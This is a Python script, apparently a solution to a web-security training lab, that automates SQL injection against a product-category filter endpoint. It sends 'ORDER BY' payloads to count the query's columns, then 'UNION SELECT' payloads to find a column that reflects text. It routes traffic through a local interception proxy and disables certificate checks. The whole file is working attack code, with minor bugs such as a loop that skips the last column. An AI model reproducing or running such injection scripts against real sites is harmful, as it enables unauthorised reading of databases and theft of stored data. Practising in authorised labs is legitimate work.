import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http' :'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
 
def sqli_exploit(url):
    path="/filter?category=Tech+gifts"
    for i in range(1,50):
        sql_payload="'order by %s--" %i
        r=requests.get(url+path+sql_payload, verify=False, proxies=proxies)
        res=r.text
        if "Internal Server Error" in res:
            return i-1
        i=i+1
    return False

def column_exploit(url,columnnum):
    path="/filter?category=Tech+gifts"
    for i in range(1,columnnum):
        string= "'adymV5'"
        payload_list=['NULL']*columnnum
        payload_list[i-1]=string
        payload="'union select " + ','.join(payload_list) + "--"
        r=requests.get(url+path+payload, verify=False, proxies=proxies)
        res=r.text
        if string.strip('\'') in res:
            return i
    return False
if __name__ == "__main__":
    try:
        url=sys.argv[1].strip()
        
    except IndexError:
        print('[-] Usage: %s <url>' %sys.argv[0])
        print('[-] Example: %s www.example.com' %sys.argv[0])
        sys.exit(-1)
    
    print("[+] Figuring out the number of columns")
    num_of_col=sqli_exploit(url)
    if num_of_col:
        print("[+] The number of colums is " + str(num_of_col) + ".")
    else:
        print("[-] sqli_attack is not successful")
    
    datatype_of_column=column_exploit(url, num_of_col)
    if datatype_of_column:
        print("[+} The colum with text data type is " + str(datatype_of_column)+ ".")
        
    else:
        print("[-] There is no column with given data type.")